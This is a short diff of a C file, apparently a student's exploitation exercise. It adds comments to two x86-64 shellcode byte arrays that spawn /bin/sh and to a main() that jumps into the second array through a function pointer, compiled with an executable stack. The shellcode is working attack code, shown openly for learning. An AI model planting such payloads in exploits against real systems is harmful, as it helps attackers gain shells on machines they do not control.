@@ -1,3 +1,11 @@
+/**
+ * Author: Nalam V S S Krishna Chaitanya,
+ * Details: CS13B021, IIT Madras.
+ */
+
+#include <stdio.h>
+
+// This is actual shellcode.
 char shellcode[] =
 "\xeb\x33\x5b\x48\x89\x5b\x08\xc6\x43\x07\x00\x48\xc7\x43\x10\x00\x00\x00\x00"
 "\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x48\x8b\x7b\x08\x48\x8d\x73\x08\x0f"
@@ -5,21 +13,27 @@ char shellcode[] =
 "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
 "\x20\x20\x20\x20\x20\x20";
 
+// This is corrected shellcode which is also optimized in size(70 bytes) and
+// rounded off to nearest multiple of 8 (72 bytes.).
+
 char shellcode2[] =
 "\xeb\x27\x5b\x48\x89\x5b\x08\x48\x31\xc0\x88\x63\x07\x48\x89\x43\x10\x89\xc2"
 "\xb0\x3b\x48\x8b\x7b\x08\x48\x8d\x73\x08\x0f\x05\x48\x31\xc9\x48\x89\xcf\xb0"
 "\x3c\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x20\x20\x20"
 "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20";
 
+/**
+ * Since we now got the shellcode let us test it and see whether it is working
+ * as we want. This file tests the ShellCode by executing it. Since it has to
+ * modify the variables so to give them executable permission use -zexecstack
+ * flag while compiling the file.
+ */
+
 void main()
 {
-	// long *ret;
-	//
-	// ret = (long*)(&ret) + 2;
-	// (*ret)=(long)shellcode;
+	void (*funcptr)(void);		// Declaring a function pointer.
 
-	void (*funcptr)(void);
-
-	funcptr = shellcode2;
-	(*funcptr)();
+	funcptr = shellcode2;		// Assigning a value to it.
+	(*funcptr)();				// This calls the shellcode2 and executes it to
+								// give a shell.
 }
